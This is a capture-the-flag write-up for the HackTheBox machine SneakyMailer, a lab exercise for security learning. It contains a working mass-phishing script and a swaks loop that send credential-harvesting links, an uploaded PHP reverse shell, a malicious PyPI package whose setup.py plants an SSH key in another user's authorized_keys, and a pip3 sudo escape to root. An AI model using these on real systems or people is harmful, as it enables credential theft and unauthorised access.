---
title: "HackTheBox — SneakyMailer Writeup"
date: 2020-12-03 11:50:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, sneakymailer, ctf, smtp, imap, phishing, ffuf, masscan, swaks, thunderbird, ftp, reverse-shell, pypi, nginx, htpasswd, python3, pip3, SSH, subdomain]
image: /assets/img/Posts/SneakyM.png
---

> SneakyMailer starts off with Web enumeration where we discover a list of email addresses and send them phishing mails. One of the user triggers the link and drops his creds via POST request, Using those creds we get access to his mailbox where we find creds for accessing FTP. Inside FTP we find a subdomain web directory to which we can upload our php reverse shell and acquire shell on the machine. Further enumerating we find another subdomain which is a PyPi server, for elevating privileges to next user we leverage this service to upload a malicious python package which drops a SSH public key allowing us to SSH as that user. For root we abuse pip3 sudo privileges permitting us to get root shell.

## Reconnaissance

#### masscan

`masscan` discovers seven open TCP ports.

```shell
cfx:  ~/Documents/htb/sneakymailer
→ masscan -e tun0 -p1-65535 --rate 500 10.10.10.197 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-23 18:38:09 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 8080/tcp on 10.10.10.197
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
```
Formatting masscan results with `awk` and `sed` and running the ports against `nmap`:

#### nmap

```shell
cfx:  ~/Documents/htb/sneakymailer
→ cat masscan.ports | grep tcp | sed 's/Discovered open port //' | awk -F/ '{print $1}' ORS=','
22,8080,80,143,25,993,21,

cfx:  ~/Documents/htb/sneakymailer
→ nmap  -sC -sV -p22,8080,80,143,25,993,21 10.10.10.197
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-24 00:19 IST
Nmap scan report for 10.10.10.197
Host is up (0.082s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: QUOTA UTF8=ACCEPTA0001 IMAP4rev1 ENABLE ACL2=UNION OK ACL CAPABILITY completed UIDPLUS THREAD=REFERENCES STARTTLS IDLE CHILDREN SORT THREAD=ORDEREDSUBJECT NAMESPACE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: QUOTA UTF8=ACCEPTA0001 IMAP4rev1 ENABLE ACL2=UNION OK ACL CAPABILITY completed UIDPLUS THREAD=ORDEREDSUBJECT SORT IDLE CHILDREN THREAD=REFERENCES AUTH=PLAIN NAMESPACE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.40 seconds
```

Port scan summary:

- Port 21: FTP
- Port 22: SSH
- Port 25: SMTP
- Port 80,8080: HTTP Service
- Port 143,993: IMAP

### Port 21: FTP

Even though `nmap` didn't point out anonymous login, it's always better to cross check it manually:

```shell
cfx:  ~/Documents/htb/sneakymailer
→ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:root): anonymous
530 Permission denied.
Login failed.
ftp> exit
221 Goodbye.
```
We are not allowed to login as anonymous.

### Port 80: sneakycorp.htb

Visiting http://10.10.10.197, we get redirected to <http://sneakycorp.htb> adding the vhost to `/etc/hosts` file, we are able to visit the website.

Home page presents us with some kind of dashboard with two Project status updates:

![website](/assets/img/Posts/SneakyM/website.png)

Except [**Team page**](http://sneakycorp.htb/team.php), all the links are non-functional. However team's page provides us lots of potential usernames and email addresses:

![team](/assets/img/Posts/SneakyM/team.png)

Using `awk` and `grep` we can create a list of all email addresses:

```
cfx:  ~/Documents/htb/sneakymailer
→ curl -s http://sneakycorp.htb/team.php | grep sneakymailer.htb | awk -F'>' '{print $2}' | awk -F '<' '{print $1}' > email.txt

```
We have a total of 57 email id's:

```shell
cfx:  ~/Documents/htb/sneakymailer
→ wc -l emails.txt
57 emails.txt

→ head -n 5 emails.txt
tigernixon@sneakymailer.htb
garrettwinters@sneakymailer.htb
ashtoncox@sneakymailer.htb
cedrickelly@sneakymailer.htb
airisatou@sneakymailer.htb
```

#### Directory Fuzzing

Using `ffuf` to discover hidden files and directories, but unfortunately we don't find anything interesting

```shell
cfx:  ~/Documents/htb/sneakymailer
→ ffuf -c -r -u http://sneakycorp.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -e .php,.txt -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://sneakycorp.htb/FUZZ
 :: Extensions       : .php .txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

index.php               [Status: 200, Size: 13538, Words: 3948, Lines: 335]
.                       [Status: 200, Size: 13538, Words: 3948, Lines: 335]
team.php                [Status: 200, Size: 26513, Words: 11161, Lines: 660]
:: Progress: [129009/129009] :: Job [1/1] :: 503 req/sec :: Duration: [0:04:16] :: Errors: 0 ::
```

### Port 8080: website

Visiting port 8080, we get a default nginx installation success page:

![nginx](/assets/img/Posts/SneakyM/nginx.png)

Since we do not find anything interesting, we can go ahead and look at it later when we have something useful.

## Shell as www-data

### Phishing E-mail

The Box name indicates it has something to do with mails, and we already have acquired a list of emails which we can use to send phishing mail.

I wrote a python script utilizing smtplib and email.message module which sends a email with body including our host ip, once a user visits this link we get a POST request on `nc` listener with users creds.

```python
#!/usr/bin/env python3

## ultrafisher by ColdFusionX ##

import smtplib
import sys
from email.message import EmailMessage
from pwn import *

stats = log.progress(f"")
emailsfile = open(sys.argv[1]).readlines()

HackerServer = (f"http://10.10.14.3:8040") # <- Change this

#Sender address
sender = 'cold@fusionsecurity.cfx'

#Loop for Email addresses
for recipients in emailsfile:
    recipients = recipients.strip()
    stats.status(f"Sending Mail to -> " f"{recipients}")

    msg = EmailMessage ()
    msg ['Subject'] = (f"Data Breach incident - Reset your password")
    msg ['From'] = sender
    msg ['To'] = recipients

#Email Body
    msg.set_content (f"Please reset your password visiting" f"{HackerServer}")
#Target Server
    try:
        mail = smtplib.SMTP ('10.10.10.197', 25)
        mail.send_message (msg)
#Failure Log
    except smtplib.SMTPException:
        print()
        log.failure(f"Error Sending mail to " + recipients)
print()
log.success(f"Phishing Mail Sent")
```

#### Sending Mail

```shell
cfx:  ~/Documents/htb/sneakymailer
→ ./ultrafisher.py emails.txt
[∧] Sending Mail to -> donnasnider@sneakymailer.htb

[+] Phishing Mail Sent
```

Once the mail is sent to all the email addresses, we should see a confirmation as `Phishing Mail Sent`. In case if we had any invalid email address the script should have pointed out that as well.

#### Creds

Once the script execution is completed we get a call back on our listener with url encoded creds. It appears the user with email id `paulbyrd@sneakymailer.htb` visited our link and dropped his creds.

```shell
cfx:  ~/Documents/htb/sneakymailer
→ nc -lvnp 8040
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8040
Ncat: Listening on 0.0.0.0:8040
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:58836.
POST / HTTP/1.1
Host: 10.10.14.3:8040
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

#### Swaks

We could also achieve the same using `swaks` a commandline tool to send emails:

```shell
cfx:  ~/Documents/htb/sneakymailer
→ for i in $(cat emails.txt); do swaks --server 10.10.10.197 --from 'cold@fusionsecurity.cfx' --to $i --header "Subject: Anything" --body "Click on http://10.10.14.3:8040"; done
=== Trying 10.10.10.197:25...
=== Connected to 10.10.10.197.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO cfx
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<cold@fusionsecurity.cfx>
<-  250 2.1.0 Ok
 -> RCPT TO:<tigernixon@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Tue, 01 Dec 2020 21:54:22 +0530
 -> To: tigernixon@sneakymailer.htb
 -> From: cold@fusionsecurity.cfx
 -> Subject: Anything
 -> Message-Id: <20201201215422.006428@cfx>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 ->
 -> Click on http://10.10.14.3:8040
 ->
 ->
 [..SNIP..]
 <-  250 2.0.0 Ok: queued as 51784246DE
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

Call-back on nc listener:

```shell
cfx:  ~/Documents/htb/sneakymailer
→ nc -lvnp 8040
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8040
Ncat: Listening on 0.0.0.0:8040
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:54932.
POST / HTTP/1.1
Host: 10.10.14.3:8040
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

After url decoding the data we have the following:

```console
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

### Paul Byrd - Mailbox access

Unfortunately Paul's creds doesn't work for on SSH or FTP but they did work for accessing his mailbox. We can use mail client such as thunderbird or Evolution to access his mailbox, here we'll be using thunderbird.

Step1: First open thunderbird then Select Local folder -> Set up an account - Select Email -> Give Paul's Email and Password

![email1](/assets/img/Posts/SneakyM/email1.png)

Step2: Select Configure Manually -> Go to Advance Config (You should see a prompt with account creation warning)

![email2](/assets/img/Posts/SneakyM/email2.png)

Step3: Change the username to `paulbyrd`

![email3](/assets/img/Posts/SneakyM/email3.png)

Step4: Go to Outgoing Server(SMTP) option and fill Server details and Username

![email4](/assets/img/Posts/SneakyM/email4.png)

Now, You should see Paul's mailbox has appeared on thunderbird, just right click -> Get Messages and done now you should have Paul's mailbox ready.

Inside Sent items, we find two mails one of which is a password reset mail.

![email5](/assets/img/Posts/SneakyM/email5.png)

### FTP - developer

Using developer creds we can login to FTP:

```console
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```
```shell
cfx:  ~/Documents/htb/sneakymailer
→ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:root): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
Inside we find a `dev` directory:
```shell
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30 00:15 dev
```
Inside dev we find website related data, although `team.php` looks familiar:

```shell
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 18:52 css
drwxr-xr-x    2 0        0            4096 May 26 18:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 18:52 js
drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 18:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
```
Trying `sneakycorp.htb/dev/team.php` didn't return anything. Which indicates there could be a subdomain which we are not aware of, having that thought in mind I decided to fuzz the site for subdomains.

```shell
cfx:  ~/Documents/htb/sneakymailer
→ ffuf -c -r -u http://10.10.10.197 -H 'Host:FUZZ.sneakycorp.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fl 335

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.197
 :: Header           : Host: FUZZ.sneakycorp.htb
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response lines: 335
________________________________________________

dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
:: Progress: [19983/19983] :: Job [1/1] :: 243 req/sec :: Duration: [0:01:22] :: Errors: 0 ::
```

Adding `dev.sneakycorp.htb` into /etc/hosts file and visiting <http://dev.sneakycorp.htb> returns the similar kind of website which we saw earlier.

![dev](/assets/img/Posts/SneakyM/dev.png)

### Reverse Shell

It appears we can upload files into ftp and the root folder is of dev.sneakycorp.htb, So we'll upload a [**PHP reverse shell**](http://pentestmonkey.net/tools/web-shells/php-reverse-shell):

```shell
ftp> put rev.php
local: rev.php remote: rev.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (26.4572 MB/s)
```

Seems there is cron running which deletes the uploaded files so we need to be quick and trigger it to get a reverse shell:

```shell
cfx:  ~/Documents/htb/sneakymailer
→ curl http://dev.sneakycorp.htb/rev.php
```

#### www-data shell

Getting a call back on `nc` listener:

```shell
cfx:  ~/Documents/htb/sneakymailer
→ nc -lvnp 8020
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8020
Ncat: Listening on 0.0.0.0:8020
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:50844.
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 12:36:06 up 13 min,  0 users,  load average: 0.03, 0.04, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@sneakymailer:/$ whoami
whoami
www-data
```

## Elevating Priv www-data -> low

### Enumeration

Initial enumeration reveals that user flag is located inside home directory of user `low` and we don't have the permission to read it.

```shell
www-data@sneakymailer:/home$ ls
low  vmail

www-data@sneakymailer:/home/low$ ls -la
total 8
www-data@sneakymailer:/home/low$ ls -la
ls -la
total 48
drwxr-xr-x 8 low  low  4096 Jun  8 03:47 .
drwxr-xr-x 4 root root 4096 May 14  2020 ..
lrwxrwxrwx 1 root root    9 May 19  2020 .bash_history -> /dev/null
-rw-r--r-- 1 low  low   220 May 14  2020 .bash_logout
-rw-r--r-- 1 low  low  3526 May 14  2020 .bashrc
drwxr-xr-x 3 low  low  4096 May 16  2020 .cache
drwx------ 3 low  low  4096 May 14  2020 .gnupg
drwxr-xr-x 3 low  low  4096 May 16  2020 .local
dr-x------ 2 low  low  4096 May 16  2020 .pip
-rw-r--r-- 1 low  low   807 May 14  2020 .profile
drwxr-xr-x 2 low  low  4096 Jun  8 03:47 .ssh
-rwxr-x--- 1 root low    33 Dec  1 11:35 user.txt
drwxr-xr-x 6 low  low  4096 May 16  2020 venv
```
Now this is where things get interesting cause based on the second mail inside paul's mailbox, user low has to install, test and erase python module in PyPI service.

![low](/assets/img/Posts/SneakyM/low.png)

### PyPI service

`ss` output shows there is service listening on 127.0.0.1:5000 which could be the PyPI service we are looking for.

```shell
www-data@sneakymailer:/$ ss -tnlp
ss -tnlp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port
LISTEN    0         5                127.0.0.1:5000             0.0.0.0:*
LISTEN    0         128                0.0.0.0:80               0.0.0.0:*        users:(("nginx",pid=764,fd=8),("nginx",pid=763,fd=8))
LISTEN    0         128                0.0.0.0:8080             0.0.0.0:*        users:(("nginx",pid=764,fd=6),("nginx",pid=763,fd=6))
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*
LISTEN    0         100                0.0.0.0:25               0.0.0.0:*
[..SNIP..]
```
Inside the home directory of www-data we find another subdomain `pypi.sneakycorp.htb` which we'll add to our hosts file:

```shell
www-data@sneakymailer:~$ ls -la
ls -la
total 24
drwxr-xr-x  6 root root 4096 May 14  2020 .
drwxr-xr-x 12 root root 4096 May 14  2020 ..
drwxr-xr-x  3 root root 4096 Jun 23 08:15 dev.sneakycorp.htb
drwxr-xr-x  2 root root 4096 May 14  2020 html
drwxr-xr-x  4 root root 4096 May 15  2020 pypi.sneakycorp.htb
drwxr-xr-x  8 root root 4096 Jun 23 09:48 sneakycorp.htb
```

Although if we try to visit <http://pypi.sneakycorp.htb> we get redirected to sneakycorp.htb

Based on our nmap scan we saw nginx is in use, looking at the nginx config files we see `pypi.sneakycorp.htb` is one of active sites:

```shell
www-data@sneakymailer:/etc/nginx/sites-enabled$ ls
pypi.sneakycorp.htb  sneakycorp.htb
```
Inside config file we see `pypi.sneakycorp.htb:8080` will proxy through 127.0.0.1:5000, where is PyPi service is listening

```c
www-data@sneakymailer:/etc/nginx/sites-enabled$ cat pypi.sneakycorp.htb

server {
        listen 0.0.0.0:8080 default_server;
        listen [::]:8080 default_server;
        server_name _;
}


server {
        listen 0.0.0.0:8080;
        listen [::]:8080;

        server_name pypi.sneakycorp.htb;

        location / {
                proxy_pass http://127.0.0.1:5000;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
        }
}
```

Now we can visit `pypi.sneakycorp.htb:8080` which clearly indicates we can create our malicious python package and host it on pypi server.

![pypi](/assets/img/Posts/SneakyM/pypi.png)

To upload the python package we'll need to be authenticated, inside `pypi.sneakycorp.htb` directory we find a `.htpasswd` file containing password hash:

```shell
www-data@sneakymailer:~/pypi.sneakycorp.htb$ ls -la
total 20
drwxr-xr-x 4 root root     4096 May 15  2020 .
drwxr-xr-x 6 root root     4096 May 14  2020 ..
-rw-r--r-- 1 root root       43 May 15  2020 .htpasswd
drwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packages
drwxr-xr-x 6 root pypi     4096 May 14  2020 venv
www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

We can crack it using john which results the creds as `pypi:soufianeelhaoui`

```shell
cfx:  ~/Documents/htb/sneakymailer
→ john --show pypi.hash
pypi:soufianeelhaoui

1 password hash cracked, 0 left
```

### Malicious Python Package

With reference to this [**article**](https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/) we can create and upload our malicious python package to PyPi server

- Step1 : Creating all the required files

```shell
www-data@sneakymailer:/tmp$ mkdir coldfx

www-data@sneakymailer:/tmp$ cd coldfx

www-data@sneakymailer:/tmp/coldfx$ touch setup.py setup.cfg README.md .pypirc

www-data@sneakymailer:/tmp/coldfx$ mkdir cfx-key

www-data@sneakymailer:/tmp/coldfx$ cd cfx-key

www-data@sneakymailer:/tmp/coldfx/cfx$ touch __init__.py

www-data@sneakymailer:/tmp/coldfx$ find .
find .
.
./cfx-key
./cfx-key/__init__.py
./.pypirc
./setup.cfg
./README.md
./setup.py
```
When we are running a python script, `__init__.py` is the file which it looks for loading the package.

- Step2 : Now using nano we'll input data into these files which is required for the package to run.

Adding an example function to `__init__.py` inside cfx-key directory

```shell
www-data@sneakymailer:/tmp/coldfx/cfx-key$ cat __init__.py
def hello_word():
print(“hello world”)
```
Defining server & authentication details into `.pypirc`:

```shell
www-data@sneakymailer:/tmp/coldfx$ cat .pypirc
[distutils]
index-servers = cfx-key

[cfx-key]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```
Adding metadata:

```shell
www-data@sneakymailer:/tmp/coldfx$ cat setup.cfg
[metadata]
description-file = README.md
```

- Step3 : Creating `setup.py` to a ssh key to low's account:

```python
from setuptools import setup

try:
    with open ('/home/low/.ssh/authorized_keys', 'a') as fl:
        fl.write ("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+OOk/amwKEW/gfCikP+y0hqTkgXyICKUegxd2bZCr7CdbACbL+zJn9cV6T4XutmP6JOetxFytws9yO01X2kxkRRhIKH8DFpall5smoaJ1biwOsd6QHQJ7QLsMQIyzhy2qbq1rmi9ubSagBU9qmV4XbQwIM8fpapyV [..SNIP..] root@cfx")

except:
    setup(
    name='cfx-key',
    packages=['cfx-key'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://sneakycorp.htb',
    author='coldfusionx',
    author_email='coldfusionx@htb',
    keywords=['pip','cfx-key','example']
    )
```

- Step4: Creating Package

```shell
www-data@sneakymailer:/tmp/coldfx$ python3 setup.py sdist
running sdist
running egg_info
creating cfx_key.egg-info
writing cfx_key.egg-info/PKG-INFO
writing dependency_links to cfx_key.egg-info/dependency_links.txt
writing top-level names to cfx_key.egg-info/top_level.txt
writing manifest file 'cfx_key.egg-info/SOURCES.txt'
reading manifest file 'cfx_key.egg-info/SOURCES.txt'
writing manifest file 'cfx_key.egg-info/SOURCES.txt'
running check
creating cfx-key-0.1
creating cfx-key-0.1/cfx-key
creating cfx-key-0.1/cfx_key.egg-info
copying files to cfx-key-0.1...
copying README.md -> cfx-key-0.1
copying setup.cfg -> cfx-key-0.1
copying setup.py -> cfx-key-0.1
copying cfx-key/__init__.py -> cfx-key-0.1/cfx-key
copying cfx_key.egg-info/PKG-INFO -> cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/SOURCES.txt -> cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/dependency_links.txt -> cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/top_level.txt -> cfx-key-0.1/cfx_key.egg-info
Writing cfx-key-0.1/setup.cfg
creating dist
Creating tar archive
removing 'cfx-key-0.1' (and everything under it)
```

- Step 5: Uploading Package

Before uploading package we need to ensure `.pypirc` is present inside the home directory, so we'll define our current directory as home.

```shell
www-data@sneakymailer:/tmp/coldfx$ export HOME=/tmp/coldfx
www-data@sneakymailer:~$ echo $HOME
/tmp/coldfx
```
So now basically we are /tmp/coldfx is the home directory.

#### Uploading

```shell
www-data@sneakymailer:~$ python3 setup.py sdist upload -r cfx-key
running sdist
running egg_info
writing cfx_key.egg-info/PKG-INFO
writing dependency_links to cfx_key.egg-info/dependency_links.txt
writing top-level names to cfx_key.egg-info/top_level.txt
reading manifest file 'cfx_key.egg-info/SOURCES.txt'
writing manifest file 'cfx_key.egg-info/SOURCES.txt'
running check
creating cfx-key-0.1
creating cfx-key-0.1/cfx-key
creating cfx-key-0.1/cfx_key.egg-info
copying files to cfx-key-0.1...
copying README.md -> cfx-key-0.1
copying setup.cfg -> cfx-key-0.1
copying setup.py -> cfx-key-0.1
copying cfx-key/__init__.py -> cfx-key-0.1/cfx-key
copying cfx_key.egg-info/PKG-INFO -> cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/SOURCES.txt -> cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/dependency_links.txt -> cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/top_level.txt -> cfx-key-0.1/cfx_key.egg-info
Writing cfx-key-0.1/setup.cfg
Creating tar archive
removing 'cfx-key-0.1' (and everything under it)
running upload
Submitting dist/cfx-key-0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK
WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
```

### SSH as low

We can confirm if our ssh was successfully written inside the ssh directory of user low:

```shell
www-data@sneakymailer:~$ cat /home/low/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+OOk/amwKEW/gfCikP+y0hqTkgXyICKUegxd2bZCr7CdbACbL+zJn9cV6T4XutmP6JOetxFytws9yO01X2kxkRRhIKH8DFpall5smoaJ1biwOsd6QHQJ7QLsMQIyzhy2qbq1rmi9ubSagBU9qmV4XbQwIM8fpapyV+cWZjvbdJWNVN5ofUBsobDL80GrzqHyde8Luijn2wsYa8/sfLtkNcvA251p20CV+Vbn7Pb72RTG/[..SNIP..]J3BAqVKtdqp4x6iVPlFaxaujgrM= root@cfx
```

Now we can SSH as low using our private key:

```shell
cfx:  ~/Documents/htb/sneakymailer
→ ssh -i cfx-key low@10.10.10.197
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105

low@sneakymailer:~$ id
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)

low@sneakymailer:~$ whoami
low
```

#### Grabbing user.txt

```shell
low@sneakymailer:~$ cat user.txt
646719dd8b4f89******************

```
## Elevating Priv: low -> root

Checking out our sudo privileges using `sudo -l` results our next privilege escalation vector:

```shell
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

With reference to [**gtfo**](https://gtfobins.github.io/gtfobins/pip/) we can escalate to root:

```shell
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.naFm00Qgl3
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```
#### Grabbing root.txt

```shell
# cat /root/root.txt
a311d05bde9ed4******************

```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
